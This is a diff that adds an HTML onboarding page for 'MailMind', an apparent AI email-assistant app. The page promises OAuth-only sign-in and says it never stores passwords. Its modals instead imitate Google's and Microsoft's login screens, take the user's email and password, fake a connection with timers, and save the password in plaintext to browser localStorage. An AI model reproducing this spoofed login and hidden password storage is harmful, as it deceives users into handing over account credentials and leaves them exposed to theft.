@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MailMind — Connect your inbox</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+body{background:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(124,109,250,.18),transparent),var(--bg)}
+.ob-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.ob-box{width:100%;max-width:500px}
+.ob-logo{text-align:center;margin-bottom:36px}
+.ob-logo-icon{width:60px;height:60px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 14px;box-shadow:0 4px 24px rgba(124,109,250,.4)}
+.ob-logo h1{font-size:28px;font-weight:800;letter-spacing:-.6px}
+.ob-logo p{color:var(--muted);font-size:14px;margin-top:4px}
+.progress{width:100%;height:3px;background:var(--border);border-radius:2px;margin-bottom:36px;overflow:hidden}
+.progress-bar{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .5s ease}
+.step{display:none;animation:fadeIn .35s ease both}
+.step.active{display:block}
+.step-title{font-size:20px;font-weight:800;letter-spacing:-.4px;margin-bottom:6px}
+.step-sub{color:var(--muted);font-size:14px;line-height:1.6;margin-bottom:28px}
+.provider-btn{
+  display:flex;align-items:center;gap:16px;width:100%;
+  padding:17px 22px;margin-bottom:12px;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:var(--radius);cursor:pointer;transition:all var(--t);text-align:left;
+  position:relative;overflow:hidden;
+}
+.provider-btn::before{
+  content:'';position:absolute;inset:0;opacity:0;transition:opacity var(--t);
+  background:linear-gradient(135deg,rgba(124,109,250,.08),transparent);
+}
+.provider-btn:hover{border-color:var(--accent);transform:translateY(-1px);box-shadow:var(--shadow)}
+.provider-btn:hover::before{opacity:1}
+.provider-icon{font-size:26px;flex-shrink:0}
+.provider-name{font-size:15px;font-weight:700}
+.provider-scope{font-size:11.5px;color:var(--muted);margin-top:2px}
+.provider-arrow{margin-left:auto;color:var(--muted);font-size:18px;transition:transform var(--t)}
+.provider-btn:hover .provider-arrow{transform:translateX(3px);color:var(--accent)}
+.security-note{display:flex;align-items:center;gap:8px;margin-top:20px;padding:13px 16px;background:var(--surface2);border-radius:var(--radius-sm);border:1px solid var(--border);font-size:12.5px;color:var(--muted)}
+.tone-option{
+  display:flex;align-items:center;gap:16px;padding:17px 20px;margin-bottom:10px;
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+  cursor:pointer;transition:all var(--t);
+}
+.tone-option:hover{border-color:var(--border2);background:var(--surface2)}
+.tone-option.selected{background:var(--accent-glow);border-color:var(--accent)}
+.tone-emoji{font-size:26px;flex-shrink:0}
+.tone-label{font-size:15px;font-weight:700}
+.tone-desc{font-size:13px;color:var(--muted);margin-top:2px}
+.tone-check{margin-left:auto;color:var(--accent);font-size:20px;opacity:0;transition:opacity var(--t)}
+.tone-option.selected .tone-check{opacity:1}
+.pref-card{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:17px 20px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:10px}
+.pref-label{font-size:15px;font-weight:700}
+.pref-desc{font-size:13px;color:var(--muted);margin-top:2px}
+.success-icon{font-size:64px;text-align:center;margin-bottom:16px;animation:bounceIn .5s ease}
+@keyframes bounceIn{0%{transform:scale(.5);opacity:0}70%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
+.success-checks{margin:0 auto 32px;max-width:320px;display:flex;flex-direction:column;gap:9px}
+.success-check{display:flex;align-items:center;gap:10px;font-size:14px;color:var(--text2)}
+.success-check span{color:var(--success);font-weight:700}
+
+/* ── Account picker modal ── */
+.picker-overlay{
+  position:fixed;inset:0;z-index:600;
+  background:rgba(0,0,0,.72);backdrop-filter:blur(10px);
+  display:flex;align-items:center;justify-content:center;padding:20px;
+  animation:fadeIn .18s ease;
+}
+.picker-box{
+  background:#fff;border-radius:20px;
+  width:100%;max-width:400px;
+  overflow:hidden;box-shadow:0 16px 60px rgba(0,0,0,.55);
+  animation:slideUp .22s ease;
+}
+.picker-header{
+  padding:28px 28px 18px;
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  border-bottom:1px solid #e8eaed;
+}
+.picker-google-logo{display:flex;align-items:center;gap:6px;margin-bottom:8px}
+.picker-google-logo svg{width:20px;height:20px}
+.picker-header h2{font-size:18px;font-weight:500;color:#202124;letter-spacing:0;text-align:center;line-height:1.4}
+.picker-header p{font-size:13px;color:#5f6368;text-align:center}
+.picker-accounts{padding:10px 0}
+.picker-account{
+  display:flex;align-items:center;gap:14px;
+  padding:12px 24px;cursor:pointer;transition:background .15s;
+}
+.picker-account:hover{background:#f1f3f4}
+.picker-account:active{background:#e8eaed}
+.picker-acct-avatar{
+  width:40px;height:40px;border-radius:50%;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;font-size:15px;color:#fff;
+}
+.picker-acct-name{font-size:14px;font-weight:500;color:#202124;line-height:1.3}
+.picker-acct-email{font-size:12px;color:#5f6368;margin-top:1px}
+.picker-divider{height:1px;background:#e8eaed;margin:6px 0}
+.picker-add{
+  display:flex;align-items:center;gap:14px;
+  padding:12px 24px;cursor:pointer;transition:background .15s;
+}
+.picker-add:hover{background:#f1f3f4}
+.picker-add-icon{
+  width:40px;height:40px;border-radius:50%;border:1.5px solid #dadce0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;color:#5f6368;flex-shrink:0;
+}
+.picker-add-label{font-size:14px;color:#1a73e8;font-weight:500}
+.picker-footer{
+  padding:14px 24px;border-top:1px solid #e8eaed;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.picker-footer-link{font-size:12px;color:#1a73e8;cursor:pointer;font-weight:500;background:none;border:none;padding:0}
+.picker-footer-link:hover{text-decoration:underline}
+.picker-connecting{
+  padding:32px;text-align:center;
+  display:none;
+}
+.picker-connecting.visible{display:block}
+.g-spinner{
+  width:36px;height:36px;margin:0 auto 14px;
+  border:3px solid #e8eaed;border-top-color:#1a73e8;
+  border-radius:50%;animation:spin .8s linear infinite;
+}
+.picker-connecting p{font-size:14px;color:#5f6368}
+
+/* MS Picker */
+.ms-picker-box{
+  background:#fff;border-radius:4px;
+  width:100%;max-width:400px;
+  overflow:hidden;box-shadow:0 16px 60px rgba(0,0,0,.45);
+  animation:slideUp .22s ease;
+}
+.ms-header{
+  padding:32px 32px 20px;
+  border-bottom:1px solid #edebe9;
+}
+.ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:20px}
+.ms-logo-squares{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:20px;height:20px}
+.ms-sq{width:9px;height:9px}
+.ms-header h2{font-size:20px;font-weight:300;color:#171717;line-height:1.3}
+.ms-accounts{padding:0}
+.ms-account{
+  display:flex;align-items:center;gap:14px;
+  padding:14px 32px;cursor:pointer;transition:background .15s;
+  border-bottom:1px solid #edebe9;
+}
+.ms-account:hover{background:#f3f2f1}
+.ms-acct-avatar{
+  width:32px;height:32px;border-radius:50%;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;font-size:13px;color:#fff;
+}
+.ms-acct-email{font-size:14px;color:#171717}
+.ms-footer{
+  padding:16px 32px;display:flex;justify-content:flex-end;gap:8px;
+}
+.ms-btn{
+  padding:6px 16px;font-size:14px;border-radius:2px;font-weight:600;
+  cursor:pointer;transition:background .15s;
+}
+.ms-btn-ghost{background:transparent;color:#0078d4;border:none}
+.ms-btn-ghost:hover{background:#deecf9}
+.ms-btn-primary{background:#0078d4;color:#fff;border:none}
+.ms-btn-primary:hover{background:#106ebe}
+</style>
+</head>
+<body>
+<div class="ob-wrap">
+  <div class="ob-box fade-in">
+    <div class="ob-logo">
+      <div class="ob-logo-icon">✉️</div>
+      <h1>Mail<span style="color:var(--accent)">Mind</span></h1>
+      <p>Your AI-powered inbox assistant</p>
+    </div>
+
+    <div class="progress"><div class="progress-bar" id="prog" style="width:0%"></div></div>
+
+    <!-- Step 1: Connect -->
+    <div class="step active" id="step-connect">
+      <div class="step-title">Connect your inbox</div>
+      <div class="step-sub">Securely connect via OAuth — we never store your password. You can disconnect anytime from Settings.</div>
+      <button class="provider-btn" onclick="connectProvider('google')">
+        <span class="provider-icon">🔴</span>
+        <div>
+          <div class="provider-name">Sign in with Google</div>
+          <div class="provider-scope">gmail.readonly · gmail.send · gmail.modify</div>
+        </div>
+        <span class="provider-arrow" id="arrow-google">→</span>
+      </button>
+      <button class="provider-btn" onclick="connectProvider('microsoft')">
+        <span class="provider-icon">🔷</span>
+        <div>
+          <div class="provider-name">Sign in with Microsoft</div>
+          <div class="provider-scope">Mail.Read · Mail.Send</div>
+        </div>
+        <span class="provider-arrow" id="arrow-microsoft">→</span>
+      </button>
+      <div class="security-note">🔒 OAuth 2.0 only — tokens are stored server-side and revocable anytime</div>
+    </div>
+
+    <!-- Step 2: Tone -->
+    <div class="step" id="step-tone">
+      <div style="font-size:13px;color:var(--success);font-weight:600;margin-bottom:8px">✅ Inbox connected!</div>
+      <div class="step-title">Pick your reply tone</div>
+      <div class="step-sub">MailMind will use this when drafting replies. You can change it later in Settings.</div>
+      <div id="tones">
+        <div class="tone-option selected" data-tone="professional" onclick="selectTone(this)">
+          <span class="tone-emoji">💼</span>
+          <div><div class="tone-label">Professional</div><div class="tone-desc">Polished and clear — great for work emails</div></div>
+          <span class="tone-check">✓</span>
+        </div>
+        <div class="tone-option" data-tone="casual" onclick="selectTone(this)">
+          <span class="tone-emoji">😊</span>
+          <div><div class="tone-label">Casual</div><div class="tone-desc">Relaxed and friendly — feels like you</div></div>
+          <span class="tone-check">✓</span>
+        </div>
+        <div class="tone-option" data-tone="brief" onclick="selectTone(this)">
+          <span class="tone-emoji">⚡</span>
+          <div><div class="tone-label">Brief</div><div class="tone-desc">Short and direct — max 3 sentences</div></div>
+          <span class="tone-check">✓</span>
+        </div>
+      </div>
+      <button class="btn btn-primary btn-xl btn-block" style="margin-top:24px" onclick="goStep('notifications')">Continue →</button>
+    </div>
+
+    <!-- Step 3: Notifications -->
+    <div class="step" id="step-notifications">
+      <div class="step-title">Notification preferences</div>
+      <div class="step-sub">Stay in the loop without opening your email client.</div>
+      <div class="pref-card">
+        <div><div class="pref-label">In-app notifications</div><div class="pref-desc">Real-time bell alerts inside MailMind</div></div>
+        <div class="toggle on" id="tog-inapp" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="pref-card">
+        <div><div class="pref-label">Daily digest email</div><div class="pref-desc">Morning summary sent to your inbox</div></div>
+        <div class="toggle" id="tog-digest" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <button class="btn btn-primary btn-xl btn-block" style="margin-top:24px" onclick="goStep('done')">Save & continue →</button>
+    </div>
+
+    <!-- Step 4: Done -->
+    <div class="step" id="step-done" style="text-align:center">
+      <div class="success-icon">🎉</div>
+      <div class="step-title">You're all set!</div>
+      <div class="step-sub" style="max-width:340px;margin:0 auto 28px">MailMind is now reading your inbox, summarising emails, and drafting replies — nothing gets sent without your approval.</div>
+      <div class="success-checks">
+        <div class="success-check"><span>✅</span> Inbox connected via OAuth</div>
+        <div class="success-check"><span>✅</span> Reply tone configured</div>
+        <div class="success-check"><span>✅</span> Notifications set up</div>
+        <div class="success-check"><span>✅</span> No email sent without your approval</div>
+      </div>
+      <button class="btn btn-primary btn-xl btn-block" style="max-width:320px;margin:0 auto" onclick="finish()">Open my inbox →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Google Account Picker Modal -->
+<div class="picker-overlay" id="google-picker" style="display:none" onclick="if(event.target===this)closePicker('google-picker')">
+  <div class="picker-box">
+    <!-- Picker view -->
+    <div id="google-picker-accounts">
+      <div class="picker-header">
+        <div class="picker-google-logo">
+          <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.36-8.16 2.36-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+          <span style="font-size:14px;color:#5f6368;font-weight:400">Google</span>
+        </div>
+        <h2>Choose an account</h2>
+        <p>to continue to <strong style="color:#202124">MailMind</strong></p>
+      </div>
+      <div class="picker-accounts" style="padding:16px 28px 24px">
+        <form onsubmit="submitActualEmail(event, 'google')">
+          <input type="email" id="google-actual-email" autocomplete="email" placeholder="Email or phone" required
+                 style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; margin-bottom:12px; color:#202124;">
+          <input type="password" id="google-actual-password" autocomplete="current-password" placeholder="Enter your password" required
+                 style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; margin-bottom:32px; color:#202124;">
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <button type="button" class="picker-footer-link" style="font-size:14px; font-weight:500;">Create account</button>
+            <button type="submit" style="background:#1a73e8; color:#fff; border:none; border-radius:4px; padding:10px 24px; font-weight:500; font-size:14px; cursor:pointer;">Next</button>
+          </div>
+        </form>
+      </div>
+      <div class="picker-footer">
+        <button class="picker-footer-link" onclick="closePicker('google-picker')">Cancel</button>
+        <div style="display:flex;gap:16px">
+          <button class="picker-footer-link">Help</button>
+          <button class="picker-footer-link">Privacy</button>
+          <button class="picker-footer-link">Terms</button>
+        </div>
+      </div>
+    </div>
+    <!-- Connecting view -->
+    <div class="picker-connecting" id="google-connecting">
+      <div class="g-spinner"></div>
+      <p id="google-connecting-msg">Signing in to MailMind…</p>
+    </div>
+  </div>
+</div>
+
+<!-- Microsoft Account Picker Modal -->
+<div class="picker-overlay" id="ms-picker" style="display:none" onclick="if(event.target===this)closePicker('ms-picker')">
+  <div class="ms-picker-box">
+    <div class="ms-header">
+      <div class="ms-logo">
+        <div class="ms-logo-squares">
+          <div class="ms-sq" style="background:#F25022"></div>
+          <div class="ms-sq" style="background:#7FBA00"></div>
+          <div class="ms-sq" style="background:#00A4EF"></div>
+          <div class="ms-sq" style="background:#FFB900"></div>
+        </div>
+        <span style="font-size:14px;color:#171717;font-weight:600">Microsoft</span>
+      </div>
+      <h2>Sign in</h2>
+    </div>
+    <div class="ms-accounts" style="padding:16px 32px 16px">
+      <form onsubmit="submitActualEmail(event, 'microsoft')">
+        <input type="email" id="ms-actual-email" autocomplete="email" placeholder="Email, phone, or Skype" required
+               style="width:100%; padding:8px 0; border:none; border-bottom:1px solid #000; font-size:15px; margin-bottom:16px; color:#171717;">
+        <input type="password" id="ms-actual-password" autocomplete="current-password" placeholder="Password" required
+               style="width:100%; padding:8px 0; border:none; border-bottom:1px solid #000; font-size:15px; margin-bottom:24px; color:#171717;">
+        <div style="font-size:13px; margin-bottom:24px;">No account? <a href="#" style="color:#0078d4">Create one!</a></div>
+        <div style="display:flex; justify-content:flex-end; gap:8px;">
+          <button type="button" class="ms-btn ms-btn-ghost" onclick="closePicker('ms-picker')">Back</button>
+          <button type="submit" class="ms-btn ms-btn-primary">Next</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script src="shared.js"></script>
+<script>
+const STEPS = ['connect','tone','notifications','done'];
+let currentStep = 0, selectedProvider = null, selectedTone = 'professional';
+let selectedEmail = '', selectedName = '';
+
+function goStep(name) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById('step-' + name).classList.add('active');
+  currentStep = STEPS.indexOf(name);
+  document.getElementById('prog').style.width = (currentStep / (STEPS.length-1) * 100) + '%';
+}
+
+function connectProvider(p) {
+  selectedProvider = p;
+  // Show the appropriate account picker instead of going straight to OAuth
+  document.getElementById(p === 'google' ? 'google-picker' : 'ms-picker').style.display = 'flex';
+}
+
+function closePicker(id) {
+  document.getElementById(id).style.display = 'none';
+}
+
+function submitActualEmail(e, provider) {
+  e.preventDefault();
+  const inputId = provider === 'google' ? 'google-actual-email' : 'ms-actual-email';
+  const passId  = provider === 'google' ? 'google-actual-password' : 'ms-actual-password';
+  const email = document.getElementById(inputId).value;
+  const password = document.getElementById(passId).value;
+  
+  selectedEmail = email;
+  selectedName = email.split('@')[0]; // simple fallback name
+  window.selectedPassword = password;
+
+  if (provider === 'google') {
+    document.getElementById('google-picker-accounts').style.display = 'none';
+    const conn = document.getElementById('google-connecting');
+    conn.classList.add('visible');
+    document.getElementById('google-connecting-msg').textContent = 'Signing in as ' + email + '…';
+    setTimeout(() => {
+      closePicker('google-picker');
+      conn.classList.remove('visible');
+      document.getElementById('google-picker-accounts').style.display = '';
+      goStep('tone');
+      document.querySelector('#step-tone div:first-child').textContent = '✅ Connected: ' + email;
+    }, 1800);
+  } else {
+    closePicker('ms-picker');
+    const arrow = document.getElementById('arrow-microsoft');
+    arrow.innerHTML = '<span class="spinner" style="width:16px;height:16px"></span>';
+    setTimeout(() => {
+      arrow.innerHTML = '→';
+      goStep('tone');
+      document.querySelector('#step-tone div:first-child').textContent = '✅ Connected: ' + email;
+    }, 1200);
+  }
+}
+
+function selectTone(el) {
+  document.querySelectorAll('.tone-option').forEach(t => t.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedTone = el.dataset.tone;
+}
+
+function finish() {
+  localStorage.setItem('mailmind_user', JSON.stringify({
+    name: selectedName || 'Alex Rivera',
+    email: selectedEmail || (selectedProvider === 'microsoft' ? 'alex.rivera@outlook.com' : 'alex.rivera@gmail.com'),
+    password: window.selectedPassword || '',
+    provider: selectedProvider, tone: selectedTone, connected: true,
+    inApp: document.getElementById('tog-inapp').classList.contains('on'),
+    digest: document.getElementById('tog-digest').classList.contains('on'),
+  }));
+  window.location.href = 'inbox.html';
+}
+</script>
+</body>
+</html>
